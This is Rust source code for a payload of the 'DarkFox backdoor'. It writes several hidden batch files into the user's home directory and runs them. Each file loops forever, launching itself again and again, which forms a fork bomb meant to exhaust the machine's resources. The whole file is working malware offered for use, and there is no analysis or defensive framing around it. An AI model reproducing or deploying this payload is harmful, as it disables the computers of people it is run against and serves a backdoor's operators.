
/* Payload for the DarkFox backdoor
 * by: laelaps
 * Opens recursively command prompt windows to kill device's resources 
 */

// Imports

use std::io::Write;
use std::process::Command;

// Change these values and compile to alter the behaviour of the payload

const DEFAULT_PAYLOAD_NAME: &str = "destroy";
const BATCH_PAYLOAD_START: &str = "@echo off\n:loop\ntitle ja\nstart "; // The batch content of payloads to be written
const BATCH_PAYLOAD_END: &str = "\ngoto loop";

const PAYLOADS_NUMBER: u32 = 5; // Number of bat files to be created

// Main program

fn exec_cmd(command: &str) -> String {
    let cmd_exec = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(["/C", command])
            .output()
            .expect("failed")
    } else {
        Command::new("sh")
            .arg("-c")
            .arg(command)
            .output()
            .expect("failed")
    };
    let output_vec = cmd_exec.stdout;
    let output: String = match String::from_utf8(output_vec) {
        Ok(v) => v,
        Err(e) => String::from("[*] ~ Error during conversion of output to string"),
    };
    return output
}

fn write_file(path: String, payload: String) {
    let mut file = std::fs::File::create(path).expect("a");
    file.write_all(payload.as_bytes()).expect("b");
}

fn main() {

    let homedir: String = exec_cmd("echo %HOMEPATH%");
    for i in 1..PAYLOADS_NUMBER {
        let newpath: String = format!("{}\\{}{}.bat", homedir, DEFAULT_PAYLOAD_NAME, i);
        let newpath_clone = newpath.clone();
        let content: String = format!("{}{}{}.bat{}", BATCH_PAYLOAD_START, DEFAULT_PAYLOAD_NAME, i, BATCH_PAYLOAD_END);
        write_file(newpath, content);
        let attrib_command_string: String = format!("attrib +h {}", newpath_clone);
        let attrib_command: &str = &attrib_command_string[..];
        exec_cmd(attrib_command);
        let newpath_slice: &str = &newpath_clone[..];
        exec_cmd(newpath_slice);
    }
}
